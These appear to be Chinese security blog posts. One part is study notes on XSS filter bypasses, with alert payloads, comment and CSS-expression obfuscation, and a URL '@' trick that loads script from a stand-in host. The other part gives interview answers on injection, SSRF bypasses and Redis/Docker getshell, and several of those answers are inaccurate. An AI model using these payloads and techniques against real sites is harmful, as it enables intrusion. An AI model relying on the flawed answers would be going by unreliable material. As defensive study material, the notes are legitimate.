 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(1111)&quot;</span>&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(111)&quot;</span>&gt;</span></span><br><span class="line">3. <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-wquiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0;javascript:alert(111)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过分析过滤器的缺陷构造可以绕过的语句</p>
<ol>
<li>如果代码中过滤注释的语句是这样的<code>&lt;!—.*—&gt;</code>则可以构造这样的语句<code>&lt;!—aaa &lt;!—bbb—&gt; ccc—&gt;ddd</code> 这样ccc就被暴露出来了</li>
<li>如果代码中对注释没有做过滤则可以构造如下的语句 <code>&lt;!—&lt;a href=&quot;—&gt;&lt;img src=x onerror=alert(111)//&quot;&gt;test&lt;/a&gt;,</code>对过滤器来书注释是不存在的，那么过滤器会认为上述语句为一个a正常的a标签，但对浏览器来说，上述则是一个img标签。</li>
</ol>
</li>
<li><p>针对IE浏览器的特殊语句</p>
<p> <img src="/archives/6eecc4bb/9bc82c060f205c9654462f96a831bb4.jpg"></p>
</li>
</ol>
<p><strong>属性中的注入</strong></p>
<ol>
<li><p>属性值大小写不敏感、引号不敏感，IE中可以给使用&#96;</p>
</li>
<li><p>标签与属性、属性名与等号、等号与属性值之间可以用空格、换行符、回车符、过着tab等替代</p>
</li>
<li><p>可以再属性的头部与尾部加上ascii中的控制字符 如&amp;#32</p>
</li>
<li><p>js中一个函数可以在另一个函数中执行</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;do_some_func(&#x27;&#x27;,alert(111),&#x27;&#x27;)&quot;</span>&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;do_some_func(&#x27;&#x27;,functiong()&#123;alert(11);alert(22)&#125;,&#x27;&#x27;)&quot;</span>&gt;</span> #执行多条语句应定义匿名函数</span><br></pre></td></tr></table></figure>
</li>
<li><p>资源类属性后面可以添加伪协议，当然该功能现如今已经被屏蔽了，不过IE6是支持的，不过<code>&lt;iframe&gt;</code>中的伪协议并没有被屏蔽</p>
</li>
<li><p>可以利用url的@属性绕过</p>
<p> 如要求输入url地址如下，src&#x3D;<a href="http://www.baidu.com,其中rul部分是我们需要构造payload的地方,如果该处的特殊字符被过滤掉了,我们则可以通过外部引入js代码的形式绕过,如/">http://www.baidu.com，其中rul部分是我们需要构造payload的地方，如果该处的特殊字符被过滤掉了，我们则可以通过外部引入js代码的形式绕过，如</a></p>
<p> src&#x3D;<a href="http://www.baidu.com@www.hack.com/inject.js">http://www.baidu.com@www.hack.com/inject.js</a> 这样@前面的内容就被当作了用户名。</p>
</li>
<li><p>支持伪协议的不常见标签属性</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">dybsrc</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>(IE6)</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">lowsrc</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>(IE6)</span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;img&quot;</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>事件</strong></p>
<p><strong>CSS中的代码注入技巧</strong></p>
<p>css分为选择符、属性名、属性值、规则（@charset）、声明（!import）</p>
<p>css代码中我们可以插入代码的部分只有资源类属性值和@import规则</p>
<p>css属性名的任何地方都可以插入反斜线\一家反斜线加0的各种组合</p>
<p>@im\po\rt “url” &#x2F;&#x2F;引入一段css代码</p>
<p>@im\po\0000000rt “url”</p>
<p>声明总包含!import故，该针对该方法的过滤效果并不好，给了我们可乘之机</p>
<p>使用expression方法在IE中执行js代码，不过直接插入该方法会导致，插入的数据在页面中一致循环，我们需要用语句限制这种循环</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title function_">expression</span>(<span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">x</span>!=<span class="number">1</span>)(<span class="title function_">alert</span>(<span class="number">1</span>);<span class="variable language_">window</span>.<span class="property">x</span>=<span class="number">1</span>;));</span><br></pre></td></tr></table></figure>

<p>我们可以通过注释来混淆expression方法</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">body&#123;<span class="attr">xss</span>:ex<span class="comment">/**/</span>pressi<span class="comment">/**/</span><span class="title function_">on</span>((<span class="variable language_">window</span>.<span class="property">x</span>==<span class="number">1</span>)?<span class="string">&#x27;&#x27;</span>:<span class="built_in">eval</span>(<span class="string">&#x27;x=1;alert(33333)&#x27;</span>));&#125;</span><br></pre></td></tr></table></figure>

<p>IE6中可以通过使用全角字符绕过</p>
<p>编码绕过</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题整理</title>
    <url>/archives/b7f3ad9b.html</url>
    <content><![CDATA[<h1 id="面试题整理"><a href="#面试题整理" class="headerlink" title="面试题整理"></a>面试题整理</h1><blockquote>
<p>能否说出对称加密与非对称加密的主要不同点</p>
</blockquote>
<p>对称加密通信双方使用协商好的同一密钥进行加密解密，非对称加密通信双方使用密钥对进行加解密，一个公钥，一个私钥，公钥加密的数据通过私钥解密，私钥加密过的数据通过公钥解密。公钥用来解密，私钥用来做身份验证。</p>
<blockquote>
<p>常见对称加密算法</p>
</blockquote>
<p>DES </p>
<p>3DES  使用三条密钥加密</p>
<p>AES</p>
<blockquote>
<p>对称加密中分组加密与流式加密的区别</p>
</blockquote>
<p>非对称加密均属于分组密码</p>
<p>流密码又称为序列密码，以序列的方式加密，首先将种子密钥通过算法生成一个密钥流，这个一个良好的伪随机数。然后按比特与明文流按照加密算法进行加密变换。加密过程中的密钥流由种子密钥通过密钥生成器产生。</p>
<p>加密过程</p>
<p>种子密码-&gt;随机数发生器-&gt;密钥流</p>
<p>明文流-&gt;(通过密钥流)-&gt;加密变换-&gt;密文流</p>
<p>又分为同步密钥流与自同步密钥流</p>
<p>分组加密</p>
<p>又称块密码，在进行加密时，先将明文编程二进制续流，然后将其编程若干个固定长度的分组，不够长度的用0进行填充到固定长度。然后逐个分组依次进行加密操作。分组长短影响密码强度，分组长度不能太短也不能太长。既要便于操作与运算又要保证密码的安全性。明文分组的长度可以与密钥分组的长度不一致，当明文分组长的时候，即带数据压缩功能，增加了解密的复杂度，当明文分组短的时候，增加了资源的消耗。每一个明文分组使用的时同一个密钥</p>
<p>加密过程</p>
<p>明文分组m-&gt;通过密钥k加密变换-&gt;密文分组c-&gt;通过密钥k解密变换-&gt;明文流分组。如果在一定周期后密钥重复，那么称为周期流密码，否则为非周期流密码</p>
<p>分组密码每次只能处理一个固定长度的明文，不足还需要补全，分组密码的体制一般首先将M‘进行填充得到消息M，使其长度为固定分组长度L的整数倍。而流密码加密时不一定得到相同的密码，因为明文的重复部分是使用密钥流的不同部分加密的。对于分组密码，在一个固定的密钥的作用下，对相同的明文加密，一定能得到相同的密文。</p>
<blockquote>
<p>说出一种流式加密算法</p>
</blockquote>
<blockquote>
<p>说出一种非对称加密算法</p>
</blockquote>
<p>RSA</p>
<blockquote>
<p>RSA与DH——Merkle-Hellman都是基于非对称的加密算法，有什么不同吗</p>
</blockquote>
<p>dh算法会在通信双方各生成一对密钥，即有两对密钥，而且它是动态的。rsa只包含一组密钥，而且是静态的，即一旦生成密钥就不会更改，除非显式得替换</p>
<blockquote>
<p>MD（Message Digest）算法的中文是什么？是加密算法吗？</p>
</blockquote>
<p>信息摘要算法，不是加密算法，经过该算法加密的数据会形成唯一的签名来标识这段数据，避免了数据被伪造的可能。不是一种加密算法，它的过程是不可逆的。</p>
<blockquote>
<p>base32&#x2F;base64&#x2F;rot13是加密算法吗</p>
</blockquote>
<p>不是，只是一种数据编码方式，rot13—-回转13</p>
<blockquote>
<p>网络模型有几层</p>
</blockquote>
<p>iso七层参考模型—应用层、会话层、表示层、传输层、网络层、数据链路层、物理层</p>
<p>tcp&#x2F;ip五层模型——应用层、传输层、网络层、数据链路层、物理层</p>
<p>四层模型———应用层、传输层、网络层、网络接口层</p>
<blockquote>
<p>三次握手的过程</p>
</blockquote>
<blockquote>
<p>四次挥手的过程</p>
</blockquote>
<blockquote>
<p>ICMP协议属于哪一层协议</p>
</blockquote>
<p>网络层      网络探测与跟踪协议</p>
<blockquote>
<p>http请求方式</p>
</blockquote>
<p>get post put delete trace connection  head options patch</p>
<blockquote>
<p>host头作用</p>
</blockquote>
<p>标识要请求的主机</p>
<blockquote>
<p>referer作用</p>
</blockquote>
<p>标识从哪个网页过来的，用来防盗链</p>
<blockquote>
<p>https密钥交换过程</p>
</blockquote>
<p>客户端发送hello包，包括tls版本，加密方式列表，一个随机数</p>
<p>服务器发送hell包，确认使用tls的加密列表，一个随机数</p>
<p>服务器发送公钥证书，</p>
<p>客户端使用根证书验证公钥证书，如果能够解密，则会发编码改变消息，再发送一个随机数，并把对称密钥发过去，</p>
<p>服务器也发送一个编码改变消息，表示后面发送的消息都是加密之后的消息</p>
<blockquote>
<p>DNS是什么，采用什么协议通信</p>
</blockquote>
<p>域名系统。tcp udp协议都有，五层协议是dns协议</p>
<blockquote>
<p>dns工作流程</p>
</blockquote>
<p>首先在浏览器缓存里面找、然后到主机缓存里面找、再到hosts文件里面找、再到本地域名解析器里面找、如果配置了转发器，则到上一级域名服务器里面找，如果没有则到根服务器里面找，根服务器告诉顶级域服务器地址，顶级域服务器告诉二级域服务器地址，依次迭代，直到找到或者超时。</p>
<blockquote>
<p>顶级域名是什么TLD？有效顶级域名ETLD是什么</p>
</blockquote>
<p>最高级的域名，域名的最后一部分，分为通用性域名与国家顶级域名</p>
<p>如github.io这一类域名，只用顶级域名不能表示，于是使用了有效顶级域名，即顶级域名加他的前一部分。</p>
<blockquote>
<p>防火墙是什么？waf是什么？iptables属于哪一种</p>
</blockquote>
<p>防火墙是用来做流量过滤的，又分为软件防火墙、硬件防火墙；代理防火墙、状态检测防火墙、透明防火墙，主要工作在三层以上，可以根据协议、端口号、地址等对流量进行拦截过滤。waf指web应用防火墙，可以检测数据包内容，最要是用来防病毒、木马的。iptables属于软件防火墙。</p>
<blockquote>
<p>iptables能根据mac地址指定规则吗？</p>
</blockquote>
<p>能</p>
<blockquote>
<p>桥接是什么，NAT是什么</p>
</blockquote>
<p>两台机器公用一张网卡，nat——网络地址转换协议，分为端口映射与端口复用两种，端口复用负责对内网的ip地址做转换，端口映射负责对讲外网访问的地址转换为内网服务器地址。</p>
<blockquote>
<p>SOP CORS CSP</p>
</blockquote>
<p>SOP 同源策略，同源策略是浏览器的基础，它建立了不同资源之间互相访问的标准，保证了资源的安全性。通过域名、端口、协议类型来判断是否同源</p>
<p>cors 跨域资源访问 因为同源策略的限制，如果我们有一个正常的需要跨域的请求，那么就不能实现，于是有了sors，通过http响应头部的acao、acam等字段规定哪写来源的请求是可以访问该资源的。这个判断是在浏览器 端发生的。</p>
<p>CSP内容安全策略，通过content-security-policy字段来指定哪写来源的js资源是可信的，能够一定程度上防止xss</p>
<blockquote>
<p>sql注入原理</p>
</blockquote>
<p>用户输入得参数直接进入sql查询语句，恶意代码破坏了sql语句原有得结构，导致了非预期的查询结果。</p>
<blockquote>
<p>sql注入的常规防御方法</p>
</blockquote>
<p>预编译技术、过滤sql关键字、过滤引号、数据转义、数据编码</p>
<blockquote>
<p>是否知道预编译查询</p>
</blockquote>
<p>知道，通过将sql语句预编译为字节码，将要输入的参数部分用问号占位，生成一个预编译语句，用户的所有输入都将被当作一个完整的字符串</p>
<blockquote>
<p>sql语句中哪写部分不能使用预编译？为什么？怎么解决</p>
</blockquote>
<p>sql语句的结构部分不能使用预编译语句，如要查询的字段名、表名部分。</p>
<p>过滤</p>
<blockquote>
<p>按注入方法分，有哪写类型</p>
</blockquote>
<p>联合查询注入、时间盲注、布尔盲注、报错注入、堆叠注入</p>
<blockquote>
<p>什么是宽字节注入</p>
</blockquote>
<p>如果mysql数据库配置了set names 或者 set_client_charset为gbk gb2312 big5这类的宽字节编码则可能存在宽字节注入。宽字节分为高字节与低字节两个部分，当后端的过滤策略中是对特殊符号进行转义那么转义符的十六进制表示正好在宽字节的低字节区，那么我们只需要找一个高字节区的编码与转义符结合，那么单引号等特殊字符就逃逸了出来。gbk的高字节区的范围为%81-%ef</p>
<blockquote>
<p>如果不能使用引号怎么写出文件</p>
</blockquote>
<p>使用十六进制编码、base64编码的方式写出</p>
<blockquote>
<p>sql注入的过程</p>
</blockquote>
<p>怕段闭合符、判断字段数、有无回显、有回显，select语句使用联合查询注入、非select语句使用报错注入、无回显使用布尔盲注、时间盲注、dnslog等方式</p>
<blockquote>
<p>udf mof提权</p>
</blockquote>
<p>前提是已经获得了一个webshell能够执行基本的mysql命令。对目标目录具有写的权限。</p>
<p>udf提权 用户自定义函数提权，导入动态连接库、导入函数、执行函数</p>
<p>mof提权，利用nullevt.mof文件以system什么执行的特性，将我们的脚本写到这个文件中进行提权。</p>
<blockquote>
<p>非关系型数据库是否存在注入问题，什么情况下会发生mongodb注入</p>
</blockquote>
<p>存在。当我们像mongodb传入的参数为一个数组的时候，如</p>
<p><code>?id[a]=123</code> </p>
<p>经过mongodb解析后变成</p>
<p><code>db.test.fin(&#123;id:&#123;a:123&#125;&#125;)</code> </p>
<p>如果a是一个操作符呢？</p>
<p><code>db.test.find(&#123;id:&#123;$ne:123&#125;&#125;)</code> </p>
<p>注入发生了</p>
<blockquote>
<p>redis是否存在注入问题</p>
</blockquote>
<p>存在，未授权访问漏洞</p>
<blockquote>
<p>redis getshell原理，为什么能写入文件</p>
</blockquote>
<p>常见getshell方法有webshll 定时任务 开启启动项 ssh免密登录。redis默认以root身份运行。</p>
<blockquote>
<p>XSS漏洞原理</p>
</blockquote>
<p>用户的输入没有经过过滤被直接得输出到浏览器页面中，恶意的输入破坏的原有的dom结构，导致js代码得以执行。</p>
<blockquote>
<p>XSS常见类型</p>
</blockquote>
<p>反射型、存储型、DOM型</p>
<blockquote>
<p>uxss&#x2F;mxss</p>
</blockquote>
<p>uxss 通用性xss，与传统型xss不一样，通用性xss利用的是浏览器本身的漏洞或者插件的漏洞，这些插件往往拥有很大的权限，不受同源策略的限制。所以即便是本身没有漏洞的网站因为这些有问题的插件的存在而存在xss问题</p>
<p>mxss 突变xss，用户正常的输入经过浏览器的多次渲染产生了不可预测的结果。其出现必须满足的一点就是，用户的输入两次出现在innerhtml中。常见的有反单引号破坏结构、引号转义等</p>
<blockquote>
<p>常见防御方法</p>
</blockquote>
<p>过滤特殊字符，敏感标签，开启xss-filter与csp、转义、实体编码、http-only</p>
<blockquote>
<p>csp是什么，如何防御的xss</p>
</blockquote>
<p>内容安全策略，通过提供白名单的方式，指定哪写来源脚本可以被执行</p>
<blockquote>
<p>xss危害</p>
</blockquote>
<p>网站钓鱼、身份伪造、键盘记录、未授权操作、xss warm</p>
<blockquote>
<p>csrf原理</p>
</blockquote>
<p>利用可浏览器对于用户的信任，实现一些非用户本人意愿的操作。用户访问带有恶意请求的url的时候，浏览器处于对用户的信任，携带存储在本地的该网站的cookie访问，从而导致不被预期期望的操作，如非法转账、删帖等</p>
<blockquote>
<p>如何检测</p>
</blockquote>
<p>是否有tooken</p>
<p>是否校验了referr</p>
<p>x-forward-url字段是否使用了正则</p>
<p>是否使用了samesite</p>
<p>自定义属性验证</p>
<p>是否使用了验证码</p>
<blockquote>
<p>常规防御方法</p>
</blockquote>
<p>上一个题目就是</p>
<blockquote>
<p>samesite是什么</p>
</blockquote>
<p>samesite—-同站、出现在cookie中，表示，只能在访问同一个站点的时候才发送cookie，那么什么是同站呢？所谓同站即etld+1 有效顶级域名加上它前面的一部分就是同站。也就是说不校验协议类型与端口号。有些严格的也会校验协议类型。防止csrf攻击</p>
<blockquote>
<p>samesite与sameorigin区别</p>
</blockquote>
<p>sameorigin校验协议、端口号、域名三个部分，主要用作防御xss攻击。只有同源的资源才能互相访问。</p>
<p>samesite简要域名部分，主要用来防御csrf攻击，制用同站的网站才能发送cookie，不同站的不发送</p>
<blockquote>
<p>ssrf原理</p>
</blockquote>
<p>服务器提供了访问其他url的接口，但未对输入做严格的过滤，导致攻击者可用这个接口访问内网资源，等。</p>
<blockquote>
<p>常见发生场景</p>
</blockquote>
<p>翻译、收藏、分享等场景</p>
<blockquote>
<p>如何检测，外带dns一定准确吗</p>
</blockquote>
<p>通过抓包软件，查看流量是否由客户端发送否则未服务端发送。</p>
<p>查找url page display等关键字</p>
<blockquote>
<p>防御方法、无法使用域名白白名单怎么办、dns重绑定怎么办</p>
</blockquote>
<p>限制使用的协议类型，限制ip,限制域名，</p>
<p>限制协议、使用ip、使用黑名单</p>
<blockquote>
<p>java是否由有ssrf问题</p>
</blockquote>
<blockquote>
<p>ssrf具体怎么利用，常见绕过方法</p>
</blockquote>
<p>gopher ftp dict file等协议用于读取本地敏感文件，探测内网主机存活情况、端口banner信息。</p>
<p>用户名</p>
<p>十进制编码</p>
<p>点好使用句号代替</p>
<p>加上根域名</p>
<p>使用？</p>
<p>dns rebinding</p>
<p>使用短域名</p>
<p>使用xip.io</p>
<blockquote>
<p>XXE原理</p>
</blockquote>
<p>web程序提供了解析xml语句的接口，利用这个接口，我们可以执行我们自己的恶意代码。</p>
<blockquote>
<p>常规防御方法</p>
</blockquote>
<p>关键字过滤</p>
<p>不允许使用外部实体</p>
<p>或者干脆不使用该接口</p>
<blockquote>
<p>涉及协议，为什么使用ftp协议外带数据而不使用http</p>
</blockquote>
<p>http</p>
<p>ppt:&#x2F;&#x2F;filter</p>
<p>file</p>
<blockquote>
<p>攻击过程，会读取哪写文件</p>
</blockquote>
<p>首先判断是否由注入点，通过珠宝观察数据类型是否符合xml格式，若是，则可能存在。</p>
<p>读取系统铭感文件、中间件配置文件、数据库配置文件等</p>
<blockquote>
<p>越权的类型</p>
</blockquote>
<p>水平越权</p>
<p>垂直越权</p>
<blockquote>
<p>常规修复方案</p>
</blockquote>
<p>判断操作用户是否对数据拥有操作权限</p>
<p>操作数据时添加where子句，限定只查询当前用户的数据</p>
<p>基于角色进行权限控制—-rbac</p>
<p>基于资源进行权限控制——</p>
<p>基于属性的权限控制——abac</p>
<p>基于第三方框架进行权限控制</p>
<blockquote>
<p>知不知道rabc与abac dac自主访问控制 mac强制访问控制</p>
</blockquote>
<p>RABC——-其基本思想是，对系统操作的各种权限不是直接授予具体的用户，而是在用户集合与权限集合之间建立一个角色集合。每一种角色对应一组相应的权限。一旦用户被分配了适当的角色后，该用户就拥有此角色的所有操作权限。这样做的好处是，不必在每次创建用户时都进行分配权限的操作，只要分配用户相应的角色即可，而且角色的权限变更比用户的权限变更要少得多，这样将简化用户的权限管理，减少系统的开销<br>ABAC——ABAC则是通过动态将一个或一组属性来判断是否满足设定的条件来进行授权判断。属性通常来说分为四类：用户属性（如用户年龄），环境属性（如当前时间），操作属性（如读取）和对象属性（如一篇文章，又称资源属性），可以看出配置非常灵活，能够满足几乎所有需求。</p>
<blockquote>
<p>并发是什么意思，会造成什么影响</p>
</blockquote>
<p>同一时间内多次发送http&#x2F;tcp请求。当多个线程同时对同一个资源进行操作的时候因为执行顺序不可控的问题，可能导致非预期的bug，从而实现多次获奖、多次收获、多次获赠的目的。并发对数据的一致性与可用性的影响很大。</p>
<blockquote>
<p>如何修复，乐观锁、悲观锁、死锁、活锁</p>
</blockquote>
<p>对数据库操作进行加锁。</p>
<p>悲观锁认为每一次对数据的操作都会改变数据，所以操作数据前都会对数据进行加锁，其他线程就不能操作数据，但是查询操作不受影响。悲观锁会锁定数据，其他操作不会影响到被锁的数据，但是普通的查询没有影响，需要用到 for update语句</p>
<p>乐观锁则认为一般情况下数据不会发生冲突，只有在提交新数据的时候才对数据进行检查，如果发生冲突则返回错误让用户决定怎么做。实现乐观锁的方法是在数据表中增加一个version字段，每当数据更新的时候这个字段执行加1操作。这样当数据更改的时候，另外一个事务访问此条数据进行更改的话就会操作失败，从而避免了并发操作错误。</p>
<p>死锁</p>
<p>是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。由于资源占用是互斥的，当某个进程提出申请资源后，使得有关进程在无外力协助下，永远分配不到必需的资源而无法继续运行，这就产生了一种特殊现象死锁。 一种情形，此时执行程序中两个或多个线程发生永久堵塞（等待），每个线程都在等待被其他线程占用并堵塞了的资源。例如，如果线程A锁住了记录1并等待记录2，而线程B锁住了记录2并等待记录1，这样两个线程就发生了死锁现象。计算机系统中,如果系统的资源分配策略不当，更常见的可能是程序员写的程序有错误等，则会导致进程因竞争资源不当而产生死锁的现象。锁有多种实现方式，比如意向锁，共享－排他锁，锁表，树形协议，时间戳协议等等。锁还有多种粒度，比如可以在表上加锁，也可以在记录上加锁</p>
<p>活锁</p>
<p>活锁指的是任务或者执行者没有被阻塞，由于某些条件没有满足，导致一直重复尝试，失败，尝试，失败。</p>
<blockquote>
<p>登录过程中会遇到什么安全问题</p>
</blockquote>
<p>密码爆破、用户名枚举、验证码失效、弱密码、手机号轰炸、万能密码、身份伪造</p>
<blockquote>
<p>针对短信的安全策略有哪写</p>
</blockquote>
<p>限制单一设备、单一ip、单一手机号发送请求的次数</p>
<p>建立上述清单的黑名单</p>
<p>采用图形验证码</p>
<p>检测ip所在地与收集号归属是否匹配——-微信账号找回</p>
<p>输入手机号实名认证</p>
<p>检测手机号有效性</p>
<p>waf拦截</p>
<p>options请求，预发送请求从后端获取令牌。发送短信页面载入的时候，向后端请求令牌。发送短信时将令牌发回服务端对比。要确保令牌不能被获取。故需要对js进行混淆。</p>
<blockquote>
<p>注册过程中会遇到哪写安全问题</p>
</blockquote>
<p>恶意注册</p>
<p>重复注册</p>
<p>覆盖注册</p>
<blockquote>
<p>找回密码过程中会遇到什么安全问题，跨步骤找回，交叉session找回</p>
</blockquote>
<p>身份冒用，用自己的手机接受验证码，验证码发出后，填写他人的账号，修改了他人的密码。即</p>
<p>邮箱弱token：找回密码链接token被猜解到</p>
<p>返回凭证：用户凭证被包含在响应数据包中，从而可以直接携带这个凭证登录，绕过了验证逻辑</p>
<p>用户凭证暴力破解：凭证简单，没有对尝试次数做限制，或者后台验证逻辑被猜解出来，从而绕过次数限制</p>
<p>用户凭证有效性</p>
<p>验证码的有效性，却没有对验证码和手机号码做绑定验证</p>
<p>安全手机重新绑定</p>
<p>凭证有效性</p>
<p>服务器是否开启了验证</p>
<p>跨步骤找回</p>
<p>注入</p>
<p>token生成可控</p>
<p>session覆盖</p>
<blockquote>
<p>OAuth 2.0授权码模式的认证过程</p>
</blockquote>
<p>该认证的目的是是否允许第三方的应用代表用户获得访问权限。</p>
<p>OAuth2.0是一种允许第三方应用程序使用资源所有者的凭据获得对资源有限访问权限的一种授权协议</p>
<p>oauth2.0有四种认证方式，授权码认证 简化模式认证 密码模式认证 客户端模式认证。</p>
<p>授权码认证过程</p>
<p>客户端点击请求认证按钮表示开始认证，浏览器弹出认证窗口，用户点击允许，认证服务器生成授权码，并重定向到我们的窗口。开始同步资源</p>
<p><img src="/archives/b7f3ad9b/Untitled.png"></p>
<ul>
<li>注册app，需要进行auth认证的网站需要先到目标网站注册，注册成功后方可进行oauth认证</li>
<li>用户向浏览器发起访问请求，浏览器询问是否连接到auth服务器，用户点击是，进入到认证过程</li>
<li>浏览器代替用户向认证服务器发送请求，携带注册app时认证服务器生成的客户端id与重定向url，认证服务器询问客户确认消息，是否确认让该王章访问。用户点击是，完成认证。</li>
<li>认证服务器重定向到上面提交的重定向url，并向请求认证的服务器返回一个认证码，auth-code。</li>
<li>请求认证的服务器携带认证码、客户端ip、客户端密码访问token endpoint服务器，该服务器返回一个access_token给请求认证的服务器。</li>
<li>请求服务器携带access_token访问服务器资源。该服务器收到access_token后向认证服务器验证该access_token，认证服务器返回用户名及权限等。资源服务器向请求认证的服务器提供资源，该服务器再发送给用户。</li>
<li>在授权码方式下，ACCESS_TOKEN 只会存在我们网站的服务器里，用户端从始至终都获取不到这个信息，我们不必害怕用户的电脑中毒了而导致 ACCESS_TOKEN 泄露。</li>
</ul>
<p>简化认证—-不使用clietn_secret，不适用认证码进行中转，访问token保存在客户端。</p>
<p><img src="/Untitled%201.png"></p>
<ul>
<li>注册</li>
<li>浏览器告知服务器要连接到认证服务器，服务器询问是否连接，用户点击是。</li>
<li>浏览器向认证服务器发起认证请求，携带客户端id以及重定向url。认真服务器发起询问，是否允许请求夫区其访问。</li>
<li>客户端确认后，认证节点将访问token返回给客户端。</li>
<li>客户端携带access_token访问资源服务器，资源服务器向认证节点确认access_token，返回用户名，权限等信息。资源服务器返回资源到客户端。</li>
</ul>
<blockquote>
<p>OAuth会有什么安全问题?token外带、csrf、url跳转</p>
</blockquote>
<p>redirect_url篡改</p>
<p>如果state参数来静态，或者不存在则可能存在csrf</p>
<blockquote>
<p>支付过程中会有什么安全问题？金额篡改、购物车篡改、优惠券重用</p>
</blockquote>
<blockquote>
<p>苹果坏账</p>
</blockquote>
<p>receipt-data被重复使用。客户在苹果商店购买产品后，苹果公司扣款成功后会发回一个receipt-data，正常的流程应该在服务端验证这个receipt-data的有效性与唯一性，但有些商家为了偷懒，在客户端只验证了器有效性，并没有验证其唯一性，导致了重复刷单的问题。这部分多出来的流水，苹果公司是不会分账的。</p>
<p>还有信用卡黑卡刷单、外币卡折扣赚差价、苹果对小额消费不做验证过程的36技术。</p>
<blockquote>
<p>描述第三方支付流程</p>
</blockquote>
<p>三方支付要经过产品层、核心层、网关层、最后到达渠道测</p>
<p>网关层主要是封装各个渠道的差异，呈现统一的接口，然后提供给上层系统调用。同时路由一般也维护在网关层，路由一般分为人工路由与规则路由。职工路由指运营人员指定支付渠道与产品之间的映射关系，规则路由则是按照业务要求设置各种路由规则。</p>
<p>核心层：一般包括会员系统、风控系统、收费系统、订单系统、清算系统、财务系统、签约系统等</p>
<p>产品层：通过核心层提供的服务组合起来，答题可分入金类产品，出金类产品</p>
<p>运营直撑层：直撑系统是一个公司提供给支付系统运行的基础设施，包括以下子系统：运维监控、日志分析、短信平台、安全机制、统计报表</p>
<p><img src="/Untitled%202.png"></p>
<blockquote>
<p>suid什么意思，被设置为suid标志位的程序就能以root身份执行了吗</p>
</blockquote>
<p>set user id     不能 ，设置了suid的文件只是让其他用户获取了要操作文件所有者的权限</p>
<blockquote>
<p>如何查看当前主机ip 开放端口 进程列表</p>
</blockquote>
<p>linux: ifconfig ip a ss netstat ps</p>
<p>windows: ipconfig  netstat tasklist</p>
<blockquote>
<p>如何查看一个进程打开&#x2F;读写的文件</p>
</blockquote>
<p>lsof -p pid</p>
<blockquote>
<p>系统疑似被入侵，需要检查哪写日志</p>
</blockquote>
<p>&#x2F;var&#x2F;log&#x2F;secure    登录日志，凡是与系统有关的登录信息都在这里</p>
<p>&#x2F;cat &#x2F;etc&#x2F;passwd 检查是否由异常的用户</p>
<p>&#x2F;var&#x2F;log&#x2F;cron 计划任务</p>
<p>&#x2F;var&#x2F;log&#x2F;btmp 错误登录日志</p>
<p>&#x2F;var&#x2F;log&#x2F;wtmp 所有的登录用户信息</p>
<p>&#x2F;var&#x2F;log&#x2F;utmp 当前登录用户信息</p>
<blockquote>
<p>什么叫正向连接、什么叫反向连接、主机不能访问公网怎么办</p>
</blockquote>
<blockquote>
<p>CDN域名，如何获取真实IP</p>
</blockquote>
<p>子站猜解 如果子站与主站在同一个C段，我们可以先获取子站的ip，然后再枚举主站。</p>
<p>让网站主动连接我们，</p>
<p>查找历史dns解析记录，也就是，使用cdn前的记录</p>
<p>网络空间搜索</p>
<p>利用其他漏洞</p>
<p>多地ping</p>
<blockquote>
<p>docker未授权访问</p>
</blockquote>
<p>docker remote api 再docker swarm开启了2375端口监听容器状态的时候，会调用这个api，如果其暴露在公网上，我们就可以使用docker客户端直接连接它，然后执行我们的命令getshell，最常见的利用就是新建一个容器，将宿主机的根目录挂载该容器中的某一个目录下，然后向宿主机的&#x2F;root&#x2F;.ssh中写入攻击机的公钥实现免密登录。</p>
<blockquote>
<p>docker里的特权模式指什么</p>
</blockquote>
<p>特权模式在6.0版本的时候被引入Docker，其核心作用是允许容器内的root拥有外部物理机的root权限，而此前在容器内的root用户只有外部物理机普通用户的权限     docker run –privileged</p>
<blockquote>
<p>获得了一个低权限的shell,如何提权，有什么常用工具吗</p>
</blockquote>
<p>内核提权</p>
<p>sudo提权</p>
<p>suid提权</p>
<p>linux配置错误提权</p>
<p>定时任务提权</p>
<p>密码复用提权</p>
<p>第三方服务提权</p>
<blockquote>
<p>当发现一个webshell，如何快速排查</p>
</blockquote>
<blockquote>
<p>遇到请求加密怎么办</p>
</blockquote>
<blockquote>
